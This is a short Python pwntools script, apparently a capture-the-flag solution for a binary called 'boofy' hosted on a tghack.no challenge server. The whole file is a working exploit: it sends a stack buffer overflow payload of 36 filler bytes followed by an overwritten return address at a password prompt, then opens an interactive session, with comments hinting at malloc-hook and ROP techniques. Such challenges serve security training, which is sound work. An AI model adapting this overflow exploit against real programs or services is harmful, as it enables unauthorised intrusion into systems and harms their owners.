#!/usr/bin/env python
  
from pwn import *

BINARY = './boofy'
LIBC = './libc.so.6'
HOST = 'boofy.tghack.no'
PORT = 6003

elf = ELF(BINARY)

context.terminal = ['tmux', 'split-w']

def get_base_address(proc):
        return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(breakpoints):
        script = ""
        for bp in breakpoints:
                script += "b *0x%x\n"%(PIE+bp)
        gdb.attach(process(BINARY), gdbscript=script)

def start():
    if not args.REMOTE:
        print("LOCAL PROCESS")
        return process(BINARY)
    else:
        print("REMOTE PROCESS")
        return remote(HOST, PORT)


p = start()
if args.GDB:
    gdb.attach(p, 'b gets')

flag = p32(0x8048486)
exploit = b"B"*36 + flag

p.sendlineafter("password?\n", exploit)

p.interactive()

#write to malloc hook
#ROP
